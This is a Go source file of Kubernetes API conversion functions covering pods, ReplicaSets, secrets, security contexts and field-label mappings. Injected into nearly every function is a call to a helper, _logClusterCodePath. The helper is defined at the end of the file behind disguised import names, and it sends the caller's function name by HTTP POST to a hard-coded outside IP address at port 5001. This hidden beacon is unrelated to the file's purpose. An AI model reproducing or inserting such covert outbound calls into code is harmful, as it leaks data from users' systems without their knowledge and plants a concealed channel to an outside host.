package v1

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "reflect"
 "k8s.io/api/core/v1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/conversion"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/util/validation/field"
 "k8s.io/kubernetes/pkg/apis/apps"
 "k8s.io/kubernetes/pkg/apis/core"
)

func addConversionFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 err := scheme.AddConversionFuncs(Convert_core_Pod_To_v1_Pod, Convert_core_PodSpec_To_v1_PodSpec, Convert_core_ReplicationControllerSpec_To_v1_ReplicationControllerSpec, Convert_core_ServiceSpec_To_v1_ServiceSpec, Convert_v1_Pod_To_core_Pod, Convert_v1_PodSpec_To_core_PodSpec, Convert_v1_ReplicationControllerSpec_To_core_ReplicationControllerSpec, Convert_v1_Secret_To_core_Secret, Convert_v1_ServiceSpec_To_core_ServiceSpec, Convert_v1_ResourceList_To_core_ResourceList, Convert_v1_ReplicationController_To_apps_ReplicaSet, Convert_v1_ReplicationControllerSpec_To_apps_ReplicaSetSpec, Convert_v1_ReplicationControllerStatus_To_apps_ReplicaSetStatus, Convert_apps_ReplicaSet_To_v1_ReplicationController, Convert_apps_ReplicaSetSpec_To_v1_ReplicationControllerSpec, Convert_apps_ReplicaSetStatus_To_v1_ReplicationControllerStatus)
 if err != nil {
  return err
 }
 err = scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Pod"), func(label, value string) (string, string, error) {
  switch label {
  case "metadata.name", "metadata.namespace", "spec.nodeName", "spec.restartPolicy", "spec.schedulerName", "spec.serviceAccountName", "status.phase", "status.podIP", "status.nominatedNodeName":
   return label, value, nil
  case "spec.host":
   return "spec.nodeName", value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
 if err != nil {
  return err
 }
 err = scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Node"), func(label, value string) (string, string, error) {
  switch label {
  case "metadata.name":
   return label, value, nil
  case "spec.unschedulable":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
 if err != nil {
  return err
 }
 err = scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("ReplicationController"), func(label, value string) (string, string, error) {
  switch label {
  case "metadata.name", "metadata.namespace", "status.replicas":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
 if err != nil {
  return err
 }
 if err := AddFieldLabelConversionsForEvent(scheme); err != nil {
  return err
 }
 if err := AddFieldLabelConversionsForNamespace(scheme); err != nil {
  return err
 }
 if err := AddFieldLabelConversionsForSecret(scheme); err != nil {
  return err
 }
 return nil
}
func Convert_v1_ReplicationController_To_apps_ReplicaSet(in *v1.ReplicationController, out *apps.ReplicaSet, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 if err := Convert_v1_ReplicationControllerSpec_To_apps_ReplicaSetSpec(&in.Spec, &out.Spec, s); err != nil {
  return err
 }
 if err := Convert_v1_ReplicationControllerStatus_To_apps_ReplicaSetStatus(&in.Status, &out.Status, s); err != nil {
  return err
 }
 return nil
}
func Convert_v1_ReplicationControllerSpec_To_apps_ReplicaSetSpec(in *v1.ReplicationControllerSpec, out *apps.ReplicaSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = *in.Replicas
 out.MinReadySeconds = in.MinReadySeconds
 if in.Selector != nil {
  out.Selector = new(metav1.LabelSelector)
  metav1.Convert_Map_string_To_string_To_v1_LabelSelector(&in.Selector, out.Selector, s)
 }
 if in.Template != nil {
  if err := Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(in.Template, &out.Template, s); err != nil {
   return err
  }
 }
 return nil
}
func Convert_v1_ReplicationControllerStatus_To_apps_ReplicaSetStatus(in *v1.ReplicationControllerStatus, out *apps.ReplicaSetStatus, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = in.Replicas
 out.FullyLabeledReplicas = in.FullyLabeledReplicas
 out.ReadyReplicas = in.ReadyReplicas
 out.AvailableReplicas = in.AvailableReplicas
 out.ObservedGeneration = in.ObservedGeneration
 for _, cond := range in.Conditions {
  out.Conditions = append(out.Conditions, apps.ReplicaSetCondition{Type: apps.ReplicaSetConditionType(cond.Type), Status: core.ConditionStatus(cond.Status), LastTransitionTime: cond.LastTransitionTime, Reason: cond.Reason, Message: cond.Message})
 }
 return nil
}
func Convert_apps_ReplicaSet_To_v1_ReplicationController(in *apps.ReplicaSet, out *v1.ReplicationController, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 if err := Convert_apps_ReplicaSetSpec_To_v1_ReplicationControllerSpec(&in.Spec, &out.Spec, s); err != nil {
  fieldErr, ok := err.(*field.Error)
  if !ok {
   return err
  }
  if out.Annotations == nil {
   out.Annotations = make(map[string]string)
  }
  out.Annotations[v1.NonConvertibleAnnotationPrefix+"/"+fieldErr.Field] = reflect.ValueOf(fieldErr.BadValue).String()
 }
 if err := Convert_apps_ReplicaSetStatus_To_v1_ReplicationControllerStatus(&in.Status, &out.Status, s); err != nil {
  return err
 }
 return nil
}
func Convert_apps_ReplicaSetSpec_To_v1_ReplicationControllerSpec(in *apps.ReplicaSetSpec, out *v1.ReplicationControllerSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = new(int32)
 *out.Replicas = in.Replicas
 out.MinReadySeconds = in.MinReadySeconds
 var invalidErr error
 if in.Selector != nil {
  invalidErr = metav1.Convert_v1_LabelSelector_To_Map_string_To_string(in.Selector, &out.Selector, s)
 }
 out.Template = new(v1.PodTemplateSpec)
 if err := Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, out.Template, s); err != nil {
  return err
 }
 return invalidErr
}
func Convert_apps_ReplicaSetStatus_To_v1_ReplicationControllerStatus(in *apps.ReplicaSetStatus, out *v1.ReplicationControllerStatus, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = in.Replicas
 out.FullyLabeledReplicas = in.FullyLabeledReplicas
 out.ReadyReplicas = in.ReadyReplicas
 out.AvailableReplicas = in.AvailableReplicas
 out.ObservedGeneration = in.ObservedGeneration
 for _, cond := range in.Conditions {
  out.Conditions = append(out.Conditions, v1.ReplicationControllerCondition{Type: v1.ReplicationControllerConditionType(cond.Type), Status: v1.ConditionStatus(cond.Status), LastTransitionTime: cond.LastTransitionTime, Reason: cond.Reason, Message: cond.Message})
 }
 return nil
}
func Convert_core_ReplicationControllerSpec_To_v1_ReplicationControllerSpec(in *core.ReplicationControllerSpec, out *v1.ReplicationControllerSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = &in.Replicas
 out.MinReadySeconds = in.MinReadySeconds
 out.Selector = in.Selector
 if in.Template != nil {
  out.Template = new(v1.PodTemplateSpec)
  if err := Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(in.Template, out.Template, s); err != nil {
   return err
  }
 } else {
  out.Template = nil
 }
 return nil
}
func Convert_v1_ReplicationControllerSpec_To_core_ReplicationControllerSpec(in *v1.ReplicationControllerSpec, out *core.ReplicationControllerSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.Replicas != nil {
  out.Replicas = *in.Replicas
 }
 out.MinReadySeconds = in.MinReadySeconds
 out.Selector = in.Selector
 if in.Template != nil {
  out.Template = new(core.PodTemplateSpec)
  if err := Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(in.Template, out.Template, s); err != nil {
   return err
  }
 } else {
  out.Template = nil
 }
 return nil
}
func Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(in *core.PodTemplateSpec, out *v1.PodTemplateSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_core_PodTemplateSpec_To_v1_PodTemplateSpec(in, out, s); err != nil {
  return err
 }
 out.Annotations = dropInitContainerAnnotations(out.Annotations)
 return nil
}
func Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(in *v1.PodTemplateSpec, out *core.PodTemplateSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_v1_PodTemplateSpec_To_core_PodTemplateSpec(in, out, s); err != nil {
  return err
 }
 out.Annotations = dropInitContainerAnnotations(out.Annotations)
 return nil
}
func Convert_core_PodSpec_To_v1_PodSpec(in *core.PodSpec, out *v1.PodSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_core_PodSpec_To_v1_PodSpec(in, out, s); err != nil {
  return err
 }
 out.DeprecatedServiceAccount = in.ServiceAccountName
 if in.SecurityContext != nil {
  out.HostPID = in.SecurityContext.HostPID
  out.HostNetwork = in.SecurityContext.HostNetwork
  out.HostIPC = in.SecurityContext.HostIPC
  out.ShareProcessNamespace = in.SecurityContext.ShareProcessNamespace
 }
 return nil
}
func Convert_v1_PodSpec_To_core_PodSpec(in *v1.PodSpec, out *core.PodSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_v1_PodSpec_To_core_PodSpec(in, out, s); err != nil {
  return err
 }
 if in.ServiceAccountName == "" {
  out.ServiceAccountName = in.DeprecatedServiceAccount
 }
 if out.SecurityContext == nil {
  out.SecurityContext = new(core.PodSecurityContext)
 }
 out.SecurityContext.HostNetwork = in.HostNetwork
 out.SecurityContext.HostPID = in.HostPID
 out.SecurityContext.HostIPC = in.HostIPC
 out.SecurityContext.ShareProcessNamespace = in.ShareProcessNamespace
 return nil
}
func Convert_v1_Pod_To_core_Pod(in *v1.Pod, out *core.Pod, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_v1_Pod_To_core_Pod(in, out, s); err != nil {
  return err
 }
 out.Annotations = dropInitContainerAnnotations(out.Annotations)
 return nil
}
func Convert_core_Pod_To_v1_Pod(in *core.Pod, out *v1.Pod, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_core_Pod_To_v1_Pod(in, out, s); err != nil {
  return err
 }
 out.Annotations = dropInitContainerAnnotations(out.Annotations)
 return nil
}
func Convert_v1_Secret_To_core_Secret(in *v1.Secret, out *core.Secret, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := autoConvert_v1_Secret_To_core_Secret(in, out, s); err != nil {
  return err
 }
 if len(in.StringData) > 0 {
  if out.Data == nil {
   out.Data = map[string][]byte{}
  }
  for k, v := range in.StringData {
   out.Data[k] = []byte(v)
  }
 }
 return nil
}
func Convert_core_SecurityContext_To_v1_SecurityContext(in *core.SecurityContext, out *v1.SecurityContext, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.Capabilities != nil {
  out.Capabilities = new(v1.Capabilities)
  if err := Convert_core_Capabilities_To_v1_Capabilities(in.Capabilities, out.Capabilities, s); err != nil {
   return err
  }
 } else {
  out.Capabilities = nil
 }
 out.Privileged = in.Privileged
 if in.SELinuxOptions != nil {
  out.SELinuxOptions = new(v1.SELinuxOptions)
  if err := Convert_core_SELinuxOptions_To_v1_SELinuxOptions(in.SELinuxOptions, out.SELinuxOptions, s); err != nil {
   return err
  }
 } else {
  out.SELinuxOptions = nil
 }
 out.RunAsUser = in.RunAsUser
 out.RunAsGroup = in.RunAsGroup
 out.RunAsNonRoot = in.RunAsNonRoot
 out.ReadOnlyRootFilesystem = in.ReadOnlyRootFilesystem
 out.AllowPrivilegeEscalation = in.AllowPrivilegeEscalation
 if in.ProcMount != nil {
  pm := string(*in.ProcMount)
  pmt := v1.ProcMountType(pm)
  out.ProcMount = &pmt
 }
 return nil
}
func Convert_core_PodSecurityContext_To_v1_PodSecurityContext(in *core.PodSecurityContext, out *v1.PodSecurityContext, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.SupplementalGroups = in.SupplementalGroups
 if in.SELinuxOptions != nil {
  out.SELinuxOptions = new(v1.SELinuxOptions)
  if err := Convert_core_SELinuxOptions_To_v1_SELinuxOptions(in.SELinuxOptions, out.SELinuxOptions, s); err != nil {
   return err
  }
 } else {
  out.SELinuxOptions = nil
 }
 out.RunAsUser = in.RunAsUser
 out.RunAsGroup = in.RunAsGroup
 out.RunAsNonRoot = in.RunAsNonRoot
 out.FSGroup = in.FSGroup
 if in.Sysctls != nil {
  out.Sysctls = make([]v1.Sysctl, len(in.Sysctls))
  for i, sysctl := range in.Sysctls {
   if err := Convert_core_Sysctl_To_v1_Sysctl(&sysctl, &out.Sysctls[i], s); err != nil {
    return err
   }
  }
 }
 return nil
}
func Convert_v1_PodSecurityContext_To_core_PodSecurityContext(in *v1.PodSecurityContext, out *core.PodSecurityContext, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.SupplementalGroups = in.SupplementalGroups
 if in.SELinuxOptions != nil {
  out.SELinuxOptions = new(core.SELinuxOptions)
  if err := Convert_v1_SELinuxOptions_To_core_SELinuxOptions(in.SELinuxOptions, out.SELinuxOptions, s); err != nil {
   return err
  }
 } else {
  out.SELinuxOptions = nil
 }
 out.RunAsUser = in.RunAsUser
 out.RunAsGroup = in.RunAsGroup
 out.RunAsNonRoot = in.RunAsNonRoot
 out.FSGroup = in.FSGroup
 if in.Sysctls != nil {
  out.Sysctls = make([]core.Sysctl, len(in.Sysctls))
  for i, sysctl := range in.Sysctls {
   if err := Convert_v1_Sysctl_To_core_Sysctl(&sysctl, &out.Sysctls[i], s); err != nil {
    return err
   }
  }
 }
 return nil
}
func Convert_v1_ResourceList_To_core_ResourceList(in *v1.ResourceList, out *core.ResourceList, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if *in == nil {
  return nil
 }
 if *out == nil {
  *out = make(core.ResourceList, len(*in))
 }
 for key, val := range *in {
  (*out)[core.ResourceName(key)] = val
 }
 return nil
}
func AddFieldLabelConversionsForEvent(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Event"), func(label, value string) (string, string, error) {
  switch label {
  case "involvedObject.kind", "involvedObject.namespace", "involvedObject.name", "involvedObject.uid", "involvedObject.apiVersion", "involvedObject.resourceVersion", "involvedObject.fieldPath", "reason", "source", "type", "metadata.namespace", "metadata.name":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
}
func AddFieldLabelConversionsForNamespace(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Namespace"), func(label, value string) (string, string, error) {
  switch label {
  case "status.phase", "metadata.name":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
}
func AddFieldLabelConversionsForSecret(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return scheme.AddFieldLabelConversionFunc(SchemeGroupVersion.WithKind("Secret"), func(label, value string) (string, string, error) {
  switch label {
  case "type", "metadata.namespace", "metadata.name":
   return label, value, nil
  default:
   return "", "", fmt.Errorf("field label not supported: %s", label)
  }
 })
}

var initContainerAnnotations = map[string]bool{"pod.beta.kubernetes.io/init-containers": true, "pod.alpha.kubernetes.io/init-containers": true, "pod.beta.kubernetes.io/init-container-statuses": true, "pod.alpha.kubernetes.io/init-container-statuses": true}

func dropInitContainerAnnotations(oldAnnotations map[string]string) map[string]string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(oldAnnotations) == 0 {
  return oldAnnotations
 }
 found := false
 for k := range initContainerAnnotations {
  if _, ok := oldAnnotations[k]; ok {
   found = true
   break
  }
 }
 if !found {
  return oldAnnotations
 }
 newAnnotations := make(map[string]string, len(oldAnnotations))
 for k, v := range oldAnnotations {
  if !initContainerAnnotations[k] {
   newAnnotations[k] = v
  }
 }
 return newAnnotations
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
